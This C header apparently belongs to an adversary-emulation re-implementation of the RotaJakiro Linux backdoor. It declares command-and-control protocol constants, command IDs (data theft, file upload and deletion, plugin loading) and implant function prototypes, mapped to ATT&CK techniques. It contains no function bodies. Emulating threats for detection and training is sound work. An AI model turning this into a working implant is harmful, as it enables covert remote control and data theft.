/**
 *@file c2_commands.h
 *
 *@bref This file contains prototypes for the c2 command functions
 * implemented by the "RotaJakiro" (rota) Linux malware documented by 360 Netlab
 *
 *@references
 * - https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
 * - https://blog.netlab.360.com/rotajakiro_linux_version_of_oceanlotus/
 **/

#ifndef C2_COMMANDS_H_
#define C2_COMMANDS_H_

#include <stdbool.h>

//RotaJakiro Magic Headers
const static unsigned char magicBytes[] = {0x3B, 0x91, 0x01, 0x10};
const static unsigned char initialBytes[] = {0x21, 0x70, 0x27, 0x20};
//const unsigned char sessionId[4] = {0x01, 0x02, 0x03, 0x04};
const static unsigned char sessionId[4] = {0x01, 0x02, 0x03, 0x04};

// declared in c2_comand
extern unsigned char payloadLen[2];
extern unsigned char keyLen[2];
extern unsigned char cmd_id[4];

const static unsigned char marker_1[] = {0xc2, 0x00};
const static unsigned char marker_2[] = {0xe2, 0x00};
const static unsigned char marker_3[] = {0xc2, 0x00};
const static unsigned char marker_4[] = {0xff,0x00};

// RotaJakiro Command IDs
// Taken from https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
const static unsigned char rota_c2_exit[4] = {0x13, 0x8e, 0x3e, 0x06};
const static unsigned char rota_c2_heartbeat[4] = {0x5c, 0xca, 0x72, 0x07};
const static unsigned char rota_c2_set_timeout[4] = {0x17,0xB1, 0xCC, 0x04};
const static unsigned char rota_c2_steal_data[4] = {0x25, 0x36, 0x60, 0xEA};
const static unsigned char rota_c2_upload_dev_info[4] = {0x18, 0x32, 0x0e, 0x00};
const static unsigned char rota_c2_upload_file[4] = {0x2E, 0x25, 0x99, 0x02};
const static unsigned char rota_c2_query_file[4] = {0x2C, 0xD9, 0x07, 0x00};
const static unsigned char rota_c2_delete_file[4] = {0x12, 0xB3, 0x62, 0x09};
const static unsigned char rota_c2_run_plugin_1[4] = {0x1B, 0x25, 0x50, 0x30};


// c2_loop
//    About:
//      Main c2 loop to process commands from handler
//    Result: Rota is sending heartbeats and recieving commands
//    MITRE ATT&CK Techniques: N/A
//    CTI: N/A
//    Other References: N/A
void c2_loop();

// c2_exit
//    About:
//      exit and kill rota
//    Result: Rota stops execution.
//    MITRE ATT&CK Techniques: N/A
//    CTI:
//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
//    Other References: N/A
void c2_exit(char *cmd_id, int sock2);


// c2_set_timeout
//    About:
//      Send heartbeat packet back to C2 Server
//    Result: update sleep time
//    MITRE ATT&CK Techniques: N/A
//    CTI:
//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
//    Other References: N/A
void c2_heartbeat(char *cmd_id, int sock);


// c2_set_timeout
//    About:
//      Set implant to sleep for N-seconds
//    Result: update sleep time
//    MITRE ATT&CK Techniques: N/A
//    CTI:
//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
//    Other References: N/A
void c2_set_timeout(int *sleeptime, int newTime);


// c2_upload_device_info
//    About:
//      Obtain information about host machine
//    Result: update char buffer with device information
//    MITRE ATT&CK Techniques:
//        T1082 System Information Discovery
//    CTI:
//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
//    Other References: N/A
void c2_upload_device_info(char *buffer);

// c2_query_file
//    About:
//      Query whether or not a file exixts
//    Result: boolean value indicating whether or not a file exists.
//    MITRE ATT&CK Techniques:
//        T1083.004 File and Directory Discovery
//    CTI:
//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
//    Other References: N/A
bool c2_query_file(char *fpath);


// c2_delete_file
//    About:
//      Delete a file
//    Result: boolean value indicating whether or not a file was deleted.
//    MITRE ATT&CK Techniques:
//        T1070.004 Indicator removal: File deletion
//    CTI:
//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
//    Other References: N/A
bool c2_delete_file(char *fpath);

// c2_run_plugin_1
//    About:
//       Execute Shared Object
//    Result: Loading and execution of Shared Objection
//    MITRE ATT&CK Techniques: TBD
//    CTI:
//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
//    Other References:
//        https://man7.org/linux/man-pages/man3/dlopen.3.html
void c2_run_plugin_1(char *funcName);

// initial_rota_pkt
//    About:
//       Create initial 82 byte header for Rota
//    Result: char * of rota header
//    MITRE ATT&CK Techniques: N/A
//    CTI: N/A
//    Other References: N/A
char *initial_rota_pkt();

// parse_c2_cmdid
//    About:
//       Parse C2 command id
//    Result: char * of  command id
//    MITRE ATT&CK Techniques: N/A
//    CTI: N/A
//    Other References: N/A
char *parse_c2_cmdid(char *buffer);

// parse_c2_payload_len
//    About:
//       Parse C2 payload len
//    Result: integer value of payload length
//    MITRE ATT&CK Techniques: N/A
//    CTI: N/A
//    Other References: N/A
int parse_c2_payload_len(char *buffer);

// parse_c2_payload
//    About:
//       Parse C2 payload for command id extraction
//    Result: char buffer for payload
//    MITRE ATT&CK Techniques: N/A
//    CTI: N/A
//    Other References: N/A
char *parse_c2_payload(char *buffer, int length);


// build_c2_response
//    About:
//       Explicitly specify the size of data to send back to c2 server
//    Result: void, data is sent to server
//    MITRE ATT&CK Techniques: N/A
//    CTI: N/A
//    Other References: N/A
void build_c2_response(char *buffer, int buffer_size, char *cmd_id, int sock);

#endif // C2_COMMANDS_H_
